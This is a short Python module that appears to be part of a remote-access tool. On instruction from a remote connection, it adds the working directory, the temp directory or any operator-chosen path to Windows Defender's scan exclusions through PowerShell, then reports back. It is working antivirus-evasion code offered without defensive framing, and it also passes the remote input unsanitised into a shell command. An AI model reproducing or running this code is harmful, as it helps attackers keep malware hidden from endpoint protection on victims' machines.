from core.utils import display_msg
import subprocess
import os
import tempfile


def exclude_path_antivirus(dir_to_add):
    all_commands = ["powershell.exe"]
    command = "Add-MpPreference -ExclusionPath " + dir_to_add
    all_commands.append(command)
    process = subprocess.run(all_commands, shell=True, capture_output=True, stdin=subprocess.DEVNULL)

    output = process.stderr.decode()
    # print(output)
    if output == "":
        display_msg(process.stdout.decode())
        display_msg("Added path to exclusion : " + dir_to_add)
        to_send = process.stdout.decode()
    else:
        display_msg(process.stderr.decode(), "r")
        display_msg("Couldn't add to exclusion : " + dir_to_add, "r")
        to_send = process.stderr.decode() + str(dir_to_add)
    return to_send


def add_exception(client):
    # print("Adding exception")
    # time.sleep(generate_random_int())
    option = client.receive_data()
    if option == "1":
        dir_to_add = str(os.getcwd())
    elif option == "2":
        dir_to_add = str(tempfile.gettempdir())
    else:
        dir_to_add = option
    
    to_send = exclude_path_antivirus(dir_to_add)
    
    client.send_data(to_send)